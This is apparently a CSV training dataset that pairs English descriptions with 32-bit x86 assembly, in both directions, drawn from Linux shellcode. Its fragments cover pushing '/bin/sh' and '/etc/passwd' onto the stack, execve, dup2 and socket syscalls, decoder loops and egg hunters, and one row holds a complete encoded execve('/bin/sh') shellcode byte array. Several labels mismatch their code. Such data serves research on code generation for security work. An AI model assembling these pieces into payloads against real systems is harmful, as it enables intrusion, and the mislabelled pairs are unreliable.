input_text,target_text
ShellCodeGen: move the contents at memory specified by x to eax,"mov eax, [x]"
ShellCodeSum: _params:,define the _params label
ShellCodeSum: push dword 0x69622f3a,push the dword 0x69622f3a onto the stack
ShellCodeSum: jnz stage,jump to the stage label if the zero flag is cleared
"ShellCodeSum: push dword 0x74652f2f \n mov ebp, esp",push double word 0x74652f2f onto the stack and point the ebp register to the stack register
ShellCodeGen: put the syscall 54 into the eax register,push byte 54 \n pop eax
ShellCodeGen: move 0x04 into al,"mov al, 0x04"
"ShellCodeSum: mov eax, 1",system call exit
ShellCodeSum: push 0x2f2f2f2f,push 0x2f2f2f2f onto the stack
"ShellCodeSum: cmp edx, 42 \n je short loc_402B13",jump to loc_402B13 if the contents of the edx register is equal to 42
ShellCodeGen: jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero,"xor bl, 0xBB \n jz encoded"
ShellCodeGen: add 0x3f3f3f3f to the contents in esi and save the result in esi,"add esi, 0x3f3f3f3f"
ShellCodeGen: push the byte 0xc onto the stack,push byte 0xc
ShellCodeGen: decrement the contents of the cl register and jump to the loop_dup label if the result is not negative,dec cl \n jns loop_dup
ShellCodeGen: push the dword 0x7665642f onto the stack,push dword 0x7665642f
"ShellCodeSum: mov al, 03h",move 03h into al
ShellCodeGen: jump short to the call_write label,jmp short call_write
ShellCodeGen: load the effective address of the result of the operation [ebp+24] into the ebx register,"lea ebx, [ebp+24]"
ShellCodeGen: define the byte string 'cp /bin/sh /tmp/sh',db 'cp /bin/sh /tmp/sh'
ShellCodeGen: wait for child to terminate,"mov eax, 7"
ShellCodeSum: message db '/etc/passwd',define the string message and initialize it to '/etc/passwd'
ShellCodeGen: move dl into the byte in eax,"mov byte [eax], dl"
ShellCodeSum: push byte 67 \n pop eax,put the syscall 67 into the eax register
ShellCodeGen: move the contents of the address [ebp+12] into ecx,"mov ecx, [ebp+12]"
ShellCodeGen: return to where the function was called,ret
ShellCodeGen: push the word 0xb315 onto the stack,push word 0xb315
ShellCodeSum: push 0x69622f3a,push 0x69622f3a onto the stack
ShellCodeGen: move a byte from bl into memory address hexstr+edx+1,"mov byte [hexstr+edx+1],bl"
"ShellCodeSum: mov bl, 0x14",move 0x14 into bl
ShellCodeGen: move 0x2 into bl,"mov bl, 0x2"
ShellCodeSum: string: db 'file1.txt',define string as the byte string 'file1.txt'
ShellCodeGen: move 0x5 into bl,"mov bl, 0x5"
"ShellCodeSum: xor ebx, ebx",zero out ebx
ShellCodeSum: call_decoder:,define call_decoder function
ShellCodeSum: loop decrypt,decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
ShellCodeGen: move dword 0x50905091 into ebx,"mov ebx, dword 0x50905091"
"ShellCodeSum: sub ebx, byte 8",subtract the byte 8 from the contents of the ebx register
ShellCodeSum: main_push:,create label main_push
ShellCodeGen: define the byte string '/etc/passwd#',db '/etc/passwd#'
"ShellCodeSum: cmp byte [ebp+ecx], 7ah",compare the byte at the memory location ebp+ecx with 7ah
ShellCodeGen: push the word 0x632d onto the stack and point the edi register to the stack register,"push word 0x632d \n mov edi, esp"
"ShellCodeSum: xor [ebx], word __flag_byte",perform xor operation between ebx register and the word __flag_byte and save the result in ebx
ShellCodeGen: jump to the address specified by the label loop if the operands are not equals in the previous comparison,jne loop
ShellCodeSum: push 0x2f656c2d,push 0x2f656c2d onto the stack
ShellCodeGen: push the byte 0x02 onto the stack,push byte 0x02
"ShellCodeSum: sub al, 1 \n jnz l1",subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
ShellCodeGen: push ebx onto the stack,push ebx
ShellCodeSum: push dword 0x10,push the dword 0x10 onto the stack
ShellCodeGen: compare the byte at the memory location buff with 61h,"cmp byte [buff], 61h"
ShellCodeSum: loop:,define the loop label
ShellCodeGen: jump short to decode if not zero,jnz short decode
ShellCodeSum: _exit:,define the _exit label
ShellCodeGen: if not equal jump to the _nex label,jne _nex
ShellCodeGen: specify file descriptor 2 standard error,"mov ebx, 2"
"ShellCodeSum: sub cl, 1 \n jnz decode",subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
"ShellCodeSum: mov byte [esp+3], 0x11",move 0x11 into the byte at address [esp+3]
ShellCodeSum: scasd \n jnz _end,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
"ShellCodeSum: mov dl, 93",move 93 into dl
ShellCodeGen: set edx to next 16 byte block,"add edx, 16"
ShellCodeSum: len equ $-encodedshellcode,define len equal to the lenght of the encodedshellcode array
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov eax, esp"
ShellCodeGen: if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B,"cmp eax, ebp \n jnz short loc_40102B"
ShellCodeGen: push the contents of ebx register onto the stack,push ebx
"ShellCodeSum: add ax, 01",add 01 to ax
"ShellCodeSum: add esp, 3",add 3 to the contents of the esp register
"ShellCodeSum: lea ebp,[ebp+0x59]",load the effective address of the operation [ebp+0x59] into the ebp register
"ShellCodeSum: mov al, 10",transfer the value 10 to the al register
ShellCodeGen: move 0x10 into dl,"mov dl, 0x10"
ShellCodeGen: define the doubleword an_integer and initialize it to 12425,an_integer dd 12425
"ShellCodeSum: lea edi, [esi]",load the effective address [esi] into edi
ShellCodeGen: move 0x167 into ax,"mov ax, 0x167"
"ShellCodeSum: xor edx, edx",clear the edx register
ShellCodeSum: push dword 0x732f636f,push the dword 0x732f636f onto the stack
ShellCodeGen: add 2 to the eax register,"add eax, 2"
"ShellCodeSum: xor ebx, ebx",clear ebx register
ShellCodeSum: pop esp,restore the top of the stack into the esp register
ShellCodeSum: inc count,increment the memory variable count
"ShellCodeSum: mov cl, byte [esi]",move the byte in esi into cl
"ShellCodeSum: xor ecx, ecx \n mul ecx",zero out eax and ecx
ShellCodeGen: push 0x6567772f to the stack,push 0x6567772f
"ShellCodeSum: mov ecx, contents",move the memory address of contents string into ecx
ShellCodeSum: push byte 0xb \n pop eax,put the syscall 0xb into the eax register
ShellCodeGen: declare the push_cmd label,push_cmd:
ShellCodeGen: decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register,"loop main_inc \n mov ebx, esp"
ShellCodeGen: multiply eax by ebx,mul ebx
ShellCodeGen: subtract 13 from the byte at the address esi,"sub byte [esi], 13"
ShellCodeGen: push the 0x74652f2f onto the stack,push 0x74652f2f
"ShellCodeSum: mov al, byte 3h",move the byte at the address 3h into al
ShellCodeGen: copy thevalue at memory address specified by di into ax,"mov ax, [di]"
ShellCodeSum: push 0x16,push 0x16 onto the stack
"ShellCodeSum: mov ebp, esp",point ebp to the esp register
ShellCodeGen: mul eax by edx,mul edx
ShellCodeGen: define the doubleword arr and initialize it to 100,arr dd 100
ShellCodeGen: push byte 6 onto the stack,push byte 6
ShellCodeGen: push 0x4f4e2029 onto the stack,push 0x4f4e2029
ShellCodeSum: push byte 0x1c \n pop eax,put the syscall 0x1c into the eax register
ShellCodeGen: push 0x64777373 onto the stack,push 0x64777373
"ShellCodeSum: xor ax, 0x539",perform a xor operation between ax and 0x539 and save the result in ax
ShellCodeSum: push edx,preserve edx on the stack
"ShellCodeSum: mov bl, byte [esi + eax + 1]",move the byte starting at the address [esi + eax + 1] into the bl register
"ShellCodeSum: mov bl, 0x5",move the value 0x5 into the bl register
ShellCodeSum: call decoder,call the decoder function
ShellCodeSum: global _start,global _start
"ShellCodeSum: mov eax, 67",sigaction
ShellCodeGen: push 0x37373333 to the stack,push 0x37373333
"ShellCodeSum: push byte 0x8 \n mov edx, esp",push the byte 0x8 onto the stack and point edx to the stack register
ShellCodeGen: define download function,download:
ShellCodeGen: get information about the file,"mov eax, 106"
ShellCodeGen: push the word 0x632d onto the stack and point the ebx register to the stack register,"push word 0x632d \n mov ebx, esp"
ShellCodeGen: define decoder function,decoder:
ShellCodeGen: reset edx to 0,"xor edx, edx"
ShellCodeGen: decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero,loopnz next
ShellCodeSum: push 0x7665642f,push 0x7665642f onto the stack
ShellCodeSum: push 0x742f2f2f,push the 0x742f2f2f onto the stack
ShellCodeGen: exchange edx with eax,"xchg edx, eax"
ShellCodeGen: declare the output label,output:
ShellCodeGen: swap the values of esi and ebx,"xchg esi, ebx"
ShellCodeGen: push the word 0x462d onto the stack,push word 0x462d
ShellCodeGen: jump short to the stage label,jmp short stage
ShellCodeGen: system call dup2,"mov eax, 63"
"ShellCodeSum: push edx \n mov eax, esp",push the contents of the edx register onto the stack and point eax to the stack register
ShellCodeSum: jmp short _start,jump short to the _start label
"ShellCodeSum: cmp eax, eax",compare the contents of eax and the contents of eax
ShellCodeGen: jump to the next_cycle label if the zero flag is cleared,jnz next_cycle
"ShellCodeSum: mov dword [esp-0x20], 0x6b2f7379",move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
"ShellCodeSum: test eax, eax \n jz proc_name",if the contents of the eax register is zero then jump to the label proc_name
"ShellCodeGen: define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68","message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68"
"ShellCodeSum: cmp dword [eax-4], egg1 \n jne _next \n jmp eax",if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
ShellCodeGen: copy the address of var into esi,"mov esi, var"
ShellCodeGen: move 0x1e into cl,"mov cl, 0x1e"
"ShellCodeSum: xchg edx, ebx",swap the values of edx and ebx registers
ShellCodeGen: call _exit,call _exit
ShellCodeGen: jump to the address specified by the operation fupdisasm+1,jmp fupdisasm+1
ShellCodeSum: loop decode,decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
"ShellCodeSum: add esp, 4",add 4 to the esp register
ShellCodeGen: add the contents of edx to the contents of eax,"add eax, edx"
"ShellCodeSum: mov cx, 01",initialize cx to 01
ShellCodeSum: dec ecx \n jns _dup2_loop,decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
"ShellCodeSum: sub esp, 4",make room for one 4-byte local variable
ShellCodeSum: jnz scan,if not 0 then jump to the scan label
ShellCodeGen: define the _build label,_build:
ShellCodeSum: push dword 0x00000000,push the doubleword 0x00000000 onto the stack
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label,loop decode \n jmp short shellcode
ShellCodeGen: push 0x37373333 onto the stack,push 0x37373333
"ShellCodeSum: mov byte [ebx], 2",move 2 into the single byte at the address stored in ebx
"ShellCodeSum: cmp dword [eax], ebx",compare the dword at the address [eax] and the contents of the ebx register
ShellCodeGen: increment esi,inc esi
ShellCodeGen: jump short to 0x2c,jmp short 0x2c
ShellCodeGen: move 0x1 into dl,"mov dl, 0x1"
"ShellCodeSum: push byte 0x1 \n mov ecx, esp",push the byte 0x1 onto the stack and point ecx to the stack register
ShellCodeGen: move 0x6374652f into the dword at address [esp-12],"mov dword [esp-12], 0x6374652f"
ShellCodeGen: move edx into ebx,"mov ebx, edx"
ShellCodeGen: push the 0xa01a8c0 onto the stack,push 0xa01a8c0
"ShellCodeSum: mov dl, 1+0feh",move 1+0feh into dl
ShellCodeGen: push zero onto the stack,"xor ecx, ecx \n push ecx"
ShellCodeSum: scasd,compare the value in eax to the doubleword addressed by edi
ShellCodeSum: jz formatting,if zero jump to the formatting label
ShellCodeGen: declare the main_inc label,main_inc:
ShellCodeGen: push the byte 10 onto the stack,push byte 10
ShellCodeGen: swap the values of edx and eax registers,"xchg edx, eax"
ShellCodeSum: loop check_even_odd \n jmp short shellcode,decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
"ShellCodeSum: mov eax, response",move address of response variable into eax
"ShellCodeSum: add eax, edx",add the contents of the edx register to the contents of eax register
ShellCodeSum: neg ebx,replaces the contents of the ebx register with its two's complement
"ShellCodeSum: add al, 0x66",add 0x66 to the contents in al and save the result in al
ShellCodeGen: jump short to the here label,jmp short here
ShellCodeGen: move 0x46 into al,"mov al, 0x46"
ShellCodeGen: perform xor operation between eax register and esi register and store the result in eax,"xor eax, [esi]"
ShellCodeGen: jump to the _start label if the zero flag is cleared,jnz _start
ShellCodeGen: define the call_write label,call_write:
"ShellCodeSum: cmp ecx, edx \n ja l1",if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
ShellCodeGen: subtract 8 from esp and save the result in esp,"sub esp, 8"
ShellCodeGen: push the word 0x6873 onto the stack,push word 0x6873
"ShellCodeSum: xor cl, 0x32",perform the xor operation between cl and 0x32 and store the resut in cl
ShellCodeGen: define two label,two:
ShellCodeGen: push the 0x2f2f2f2f onto the stack,push 0x2f2f2f2f
"ShellCodeSum: mov byte [esp], 0x0a",move 0x0a into the byte at address [esp]
ShellCodeGen: jump to the encrypt label,jmp encrypt
ShellCodeGen: push the word 0x5445 onto the stack,push word 0x5445
ShellCodeSum: push 0x6e776f64,push the 0x6e776f64 onto the stack
ShellCodeGen: make the system call read,"mov eax, 3"
ShellCodeSum: dec ebx,decrement the ebx register by one
"ShellCodeSum: mov al, 0x30",move 0x30 into al
ShellCodeGen: increment the contents of the bx register,inc bx
"ShellCodeSum: sub ax, 1662",subtract the contents of the ax register by 1662
ShellCodeGen: jump to label exit if equal to 0,je exit
ShellCodeSum: push 0x7372656f,push 0x7372656f onto the stack
ShellCodeGen: push 0x2f2f2f2f to the stack,push 0x2f2f2f2f
"ShellCodeSum: mov eax, msg1",move the address of msg1 into eax
ShellCodeSum: push word [edx],push the word [edx] to the stack
ShellCodeSum: db 'cp /bin/sh /tmp/sh',define the byte string 'cp /bin/sh /tmp/sh'
ShellCodeGen: move 0x2e into al,"mov al, 0x2e"
ShellCodeGen: push the dword 0x5f657a69 onto the stack,push dword 0x5f657a69
ShellCodeGen: put the byte VALUE into the eax register,push byte VALUE \n pop eax
"ShellCodeSum: loop main_inc \n mov ebx, esp",decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
"ShellCodeSum: xchg esi, eax",swap the values of esi and eax
"ShellCodeSum: cmp al, cl",compare the contents of al with the cl register
ShellCodeGen: put the syscall 4 into the eax register,push byte 4 \n pop eax
ShellCodeGen: multiply eax by 2 using left shift,"shl eax, 1"
ShellCodeGen: move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx,"mov word [ebx], 2"
"ShellCodeSum: cmp eax, ebx \n je all \n xor eax, eax",jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
ShellCodeGen: push the ebp onto the stack,push ebp
"ShellCodeSum: sub esp, 4",make space on stack
ShellCodeGen: push the 0x2 onto the stack,push 0x2
ShellCodeGen: subtract 23 from the contents of the ecx register,"sub ecx, 23"
ShellCodeGen: push the word 0x1b6 to the stack,push word 0x1b6
ShellCodeGen: push the contents of the ebp register onto the stack,push ebp
ShellCodeSum: push byte 0x02 \n pop eax,put the syscall 0x02 into the eax register
ShellCodeSum: push byte 0x2f \n pop eax,put the syscall 0x2f into the eax register
"ShellCodeSum: xor zero_reg, zero_reg",clear zero_reg
ShellCodeGen: push the byte 3h onto the stack,push byte 3h
ShellCodeGen: define word2 signed word and initialize it to -32768,word2 sword –32768
ShellCodeGen: jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register,"cmp al, 0xaa \n je decode_insertion \n xor al, bl"
ShellCodeGen: push 0x61702f63 onto the stack,push 0x61702f63
ShellCodeGen: move 0xfeffff80 into eax,"mov eax, 0xfeffff80"
"ShellCodeSum: xor eax, eax \n push eax",clear the eax register and push its contents onto the stack
ShellCodeGen: declare the here label,here:
"ShellCodeSum: mov cx, 0x301",move the value 0x301 into the cx register
ShellCodeGen: call the write function,call write
ShellCodeGen: zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register,"xor ecx, ecx \n cmp ebx, ecx \n je l1"
ShellCodeGen: call the start function,call start
ShellCodeSum: 3:,define the label 3
ShellCodeGen: put the syscall 0x2 into the al register,"mov al, 0x2"
ShellCodeGen: jump if less than to label finished,jl finished
"ShellCodeSum: mov eax, 48",install signal handel
ShellCodeGen: push 0x2923 onto stack port,push word 0x2923
ShellCodeSum: push esp,push esp onto the stack
ShellCodeGen: define the byte string path and initialize it to '//bin/sh',path db '//bin/sh'
ShellCodeGen: move starting address of array to ecx,"mov ecx, offset array"
ShellCodeGen: put /bin/sh into the edx register,"push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp"
ShellCodeGen: add 0x2 to the contents in cl and save the result in cl,"add cl, 0x2"
ShellCodeGen: put the syscall 2 into the eax register,push byte 2 \n pop eax
ShellCodeGen: move al into the byte at address [esi+7],"mov byte [esi+7], al"
"ShellCodeSum: sub esp, 4",allocate memory for variable
"ShellCodeSum: xor byte [esi], cl",perform a xor operation between a byte in esi and cl
ShellCodeGen: increment the contents of the al register,inc al
"ShellCodeSum: test eax, eax \n jz proc_name",jump to the label proc_name if the contents of the eax register is zero
ShellCodeSum: int 80h,make syscall to terminate the program
ShellCodeGen: push 0x74652f2f onto the stack,push 0x74652f2f
ShellCodeGen: declare inc_dec function,inc_dec:
ShellCodeSum: neg_number dw -12345,define the variable neg_number of words and initialize it to -12345
ShellCodeSum: jb write,jump to label write if below
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov esi, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
"ShellCodeSum: add dx, 0x1b",add the value 0x1b into the dx register
ShellCodeGen: swap the contents of the eax register with the contents of the ecx register,"xchg eax, ecx"
ShellCodeGen: move bl into the byte at address [esi],"mov byte [esi], bl"
ShellCodeSum: inc edx,increment edx
ShellCodeSum: jz find_egg,jump to find_egg if zero
ShellCodeGen: jump to the instruction labeled begin,jmp begin
ShellCodeSum: scasd \n jnz IncAddr \n jmp edi,jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
"ShellCodeSum: shl eax, 16",left shift the contents of eax 16 bits
"ShellCodeSum: sub dl, al \n jns decode_pr",subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
ShellCodeGen: perform the xor operation between the eax register and the value 0x6e696230,"xor eax, 0x6e696230"
"ShellCodeSum: sub eax, 0x10",subtract 0x10 from eax
"ShellCodeSum: xor eax, [edi]",perform the xor operation between eax register and edi register and store the result in eax
ShellCodeSum: jmp read,jump to the read label
"ShellCodeSum: mov eax, 7",system call waitpid
"ShellCodeSum: mov ecx, m_src3",move m_src3 to ecx
ShellCodeSum: push 0x74756f2f,push the 0x74756f2f onto the stack
"ShellCodeSum: mov cl, byte_table+2",move the 3rd element of the byte_table into cl
ShellCodeGen: move address of response variable into edx,"mov edx, response"
"ShellCodeSum: mov [ebp+var_a], eax",move the contents of eax into address defined by ebp+var_a
ShellCodeGen: move 0x3f into eax,"mov eax, 0x3f"
ShellCodeGen: push the dword 0x61747069 onto the stack,push dword 0x61747069
"ShellCodeSum: mov ebx, msg",move the address of msg string into ebx
"ShellCodeSum: xor [ecx + 116], bh",perform xor operation between the value stored at the location ecx+116 and bh
ShellCodeSum: push dword 0x6d6f646e,push the dword 0x6d6f646e onto the stack
ShellCodeSum: section .data,section data
ShellCodeGen: compare if ecx is equal to 10,"cmp ecx, 10"
"ShellCodeSum: cmp eax, 0",compare if eax is zero
"ShellCodeSum: xor ebx, word __flag_byte",perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
ShellCodeGen: load the effective address of the result of the operation [esi+8] into the ecx register,"lea ecx, [esi+8]"
"ShellCodeSum: add eax, 16",add 16 to eax
ShellCodeSum: push esi,push esi onto the stack
ShellCodeSum: not edx,perform a bit-wise inversion of edx
"ShellCodeSum: mov eax, 0x2f3e20",move 0x2f3e20 into eax
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jle lowbound",jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
"ShellCodeSum: mov ecx, 1",move 1 into ecx
"ShellCodeSum: lea cx, [bp+di+0x32]",load the effective address of the operation [bp+di+0x32] into the cx register
"ShellCodeSum: xchg ebx, ecx",exchange ebx with ecx
"ShellCodeSum: cmp cl, 0x3 \n jne loop",jump to the loop label if the contents of the cl register is not equal to the value 0x3
ShellCodeGen: push the word 0x662d onto the stack and point the esi register to the stack register,"push word 0x662d \n mov esi, esp"
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register,"mov ebx, [ebp-4]"
ShellCodeGen: subtract 1 from the contents of the cl register,"sub cl, 1"
ShellCodeSum: push byte 0x1f \n pop eax,put the syscall 0x1f into the eax register
ShellCodeGen: jump to the data label,jmp data
ShellCodeGen: push 0x2e373231 to the stack,push 0x2e373231
ShellCodeGen: put the syscall 0x1f into the eax register,push byte 0x1f \n pop eax
ShellCodeSum: realarray resq 10,reserve an array of ten reals for realarray
ShellCodeSum: push dword 0x0501a8c0,push the dword 0x0501a8c0 onto the stack
ShellCodeGen: define path as the byte string '//bin/sh',path db '//bin/sh'
"ShellCodeSum: mov al, byte 0bh",move the byte 0bh into al
ShellCodeSum: neg eax,negate the contents of eax
"ShellCodeSum: mov al, byte 2h",move the byte 2h into al
ShellCodeSum: push byte 11,push the byte 11 to the stack
ShellCodeGen: left rotate the contents of the edi register by 1 bit,"rol edi, 1"
ShellCodeGen: define call_shellcode function,call_shellcode:
ShellCodeGen: if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3,"cmp dl, 27 \n jge l3"
ShellCodeSum: push 0x752f2f2f,push 0x752f2f2f to the stack
ShellCodeGen: subtract 3e716230 from the contents of the eax register,"sub eax, 3e716230"
ShellCodeGen: write to the stdin file,"mov ebx, 0"
"ShellCodeSum: mov dword [esp-4], ecx",move ecx into the doubleword starting at the address esp-4
ShellCodeGen: if the contents of the bl register is not zero then jump to the label not_found,"test bl, bl \n jz not_found"
ShellCodeGen: mask out lowest 4 bits of the edx register,"and edx, 0000000fh"
ShellCodeGen: mask out lowest 4 bits of the ecx register,"and ecx, 0000000fh"
ShellCodeGen: allocate my_table vector of 10 words each initialized to 0,my_table times 10 dw 0
ShellCodeSum: fupdisasm:,define fupdisasm label
ShellCodeGen: move the byte at the address 6h into al,"mov al, byte 6h"
ShellCodeSum: push 1,push 1 onto the stack
"ShellCodeSum: mov eax, 1",exit
ShellCodeSum: push 0x8,push 0x8 onto the stack
ShellCodeGen: push the 0x4 onto the stack,push 0x4
"ShellCodeSum: mov [esi+13], al",move al into the address [esi+13]
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",push ASCII /bin/sh onto the stack and point the ebx register to the stack register
"ShellCodeSum: mov eax, 0x3f",move 0x3f into eax
"ShellCodeSum: mov edx, bufflen",move bufflen into edx
ShellCodeGen: jump to the address specified by the operation fupdisasm+3,jmp fupdisasm+3
ShellCodeSum: push esi,push the esi onto the stack
ShellCodeGen: left shift the contents of the edi register by 0x1 bit,"shl edi, 0x1"
"ShellCodeSum: add ebx, ecx",add ecx to ebx
ShellCodeSum: var_b db 'c',allocate one byte of memory for var_b variable and initialize it to 'c'
"ShellCodeSum: push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp",put /bin/sh into the edx register
ShellCodeGen: move dl into the single byte at the address stored in ecx+92,"mov byte [ecx+92], dl"
ShellCodeGen: push the byte +0x46 onto the stack,push byte +0x46
ShellCodeGen: make room on the stack for local variable,"sub esp, 4"
ShellCodeSum: push '//pa',push '//pa' onto the stack
"ShellCodeSum: mov dl, 0x1",move 0x1 into dl
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label,"cmp eax, ebx \n je L1"
"ShellCodeSum: mov eax, 1",move the value one into eax
"ShellCodeSum: mov byte [esi+17],al",move the contents of al into the byte at the memory location specified by the operation [esi+17]
ShellCodeGen: push 0x2431243a onto the stack,push 0x2431243a
ShellCodeGen: jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label,"cmp bl, al \n je loop_2 \n jmp short not_found"
"ShellCodeSum: mov ecx, hexstr",move hexstr into ecx
"ShellCodeSum: mov byte al, 0x3f",move 0x3f into the byte in al
ShellCodeGen: jump to the shell label,jmp shell
"ShellCodeSum: add bx, ax",add ax to bx
ShellCodeGen: zero out the edx register and push zero onto the stack,"xor edx, edx \n push edx"
ShellCodeSum: pop ebx,restore the top of the stack into the ebx register
ShellCodeGen: move the byte at the address 0eh into bl,"mov bl, byte 0eh"
"ShellCodeSum: xchg eax, esi",swap the contents of eax and esi
ShellCodeSum: neg edi,negate edi
ShellCodeSum: push byte 0x1,push the byte 0x1 onto the stack
ShellCodeGen: push the dword 0x10 onto the stack,push dword 0x10
ShellCodeGen: move 0x7 into al,"mov al, 0x7"
ShellCodeGen: push 0x7374736f onto the stack,push 0x7374736f
ShellCodeSum: _setsockopt:,define the _setsockopt label
"ShellCodeSum: add edx, ecx",add ecx to edx
ShellCodeGen: jump to the label proc_name if the contents of the eax register is zero,"test eax, eax \n jz proc_name"
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov edi, esp"
ShellCodeGen: jump to loc_402b13 if equal,je short loc_402b13
"ShellCodeSum: mov eax, 6",invoke sys_close
"ShellCodeSum: mov eax, 2",system call fork
ShellCodeGen: jump to the next_cycle label if the zero flag is set,jz next_cycle
ShellCodeGen: push 0x3170762d onto the stack,push 0x3170762d
ShellCodeSum: push edi,push edi to the stack
ShellCodeGen: declare the dup2 label,dup2:
ShellCodeGen: define the callpop function,callpop:
ShellCodeGen: define the _params label,_params:
ShellCodeSum: push 0x3170762d,push 0x3170762d to the stack
ShellCodeGen: if zero jump to the formatting label,jz formatting
ShellCodeGen: if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register,"cmp eax, ebx \n je 0x47 \n xor ecx, ecx"
ShellCodeGen: move doublewords from the stack into the general purpose registers,popad
"ShellCodeSum: mov edx, 1",move 1 into edx
ShellCodeSum: int 0x80,execute execve syscall
ShellCodeSum: buffer: resb 64,reserve 64 bytes for buffer
ShellCodeGen: move the contents of the al register at the memory location specified by the operation [bp+0x0a],"mov [bp+0x0a], al"
"ShellCodeSum: mov eax, 0xdeadc0de",move 0xdeadc0de into eax
ShellCodeGen: load the effective address of the result of the operation [esi+26] into the edx register,"lea edx, [esi+26]"
ShellCodeGen: push the byte +0x10 onto the stack,push byte +0x10
ShellCodeSum: jne checkbuzz,if the remainder is not equal to zero jump to local label checkbuzz
"ShellCodeSum: mov eax, 20",make the system call getpid
ShellCodeGen: push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x6168732f \n push 0x6374652f \n mov ebx, esp"
ShellCodeGen: subtract 0x7 from the byte in esi register,"sub bl, byte [esi]"
